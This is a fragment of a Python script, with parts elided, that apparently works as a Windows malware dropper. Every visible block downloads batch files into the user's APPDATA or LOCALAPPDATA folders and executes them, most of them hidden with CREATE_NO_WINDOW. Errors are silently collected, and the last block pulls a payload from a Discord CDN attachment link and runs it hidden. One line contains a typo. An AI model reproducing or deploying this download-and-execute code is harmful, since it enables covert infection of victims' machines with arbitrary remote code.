...
try:
    ...
    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbaxz.bat")
    time.sleep(5)
    ...
    os.replace(os.getenv('APPDATA')+"\\bbaxz.bat", direc+"\\bbaxz.bat")
    time.sleep(1)
    subprocess.Popen(direc+"\\bbaxz.bat")
    time.sleep(5)
    prepath = os.getcwd()
    os.chdir(direc)
    os.system("bbaxz.bat")
    ...
    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbaxz.bat")
    time.sleep(2)
    subprocess.Popen(os.getenv('APPDATA')+"\\bbaxz.bat", creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleeep(2)
    os.chdir(prepath)
...
try:
    ...
    path,_ = urllib.request.urlretrieve(t, os.getenv('LOCALAPPDATA')+"\\bbaxz4.bat")
    time.sleep(5)

    subprocess.Popen(os.getenv('LOCALAPPDATA')+"\\bbaxz4.bat", creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    err = err +" - "+str(e)
...
try:
    ...
    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbaxz3.bat")
    time.sleep(5)

    subprocess.Popen(os.getenv('APPDATA')+"\\bbaxz3.bat", creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    err = err +" - "+str(e)
...
def download(url):
    ...
    file_name  = os.getenv('APPDATA')+"\\bbaxz2.bat"
    with open(file_name, 'wb') as f:
        for chunk in get_response.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
try:
    url = "https://cdn.discordapp.com/attachments/1236874551627874375/1237530042968572004/bbaxz.txt?ex=663bfb2a&is=663aa9aa&hm=100cbe219d2fbcf486244d190ed8888842562540eb52a57cdc5376cf60e55482&"
    download(url)
    time.sleep(1)
    subprocess.Popen(os.getenv('APPDATA')+"\\bbaxz2.bat", creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    err = err + " - "+str(e)
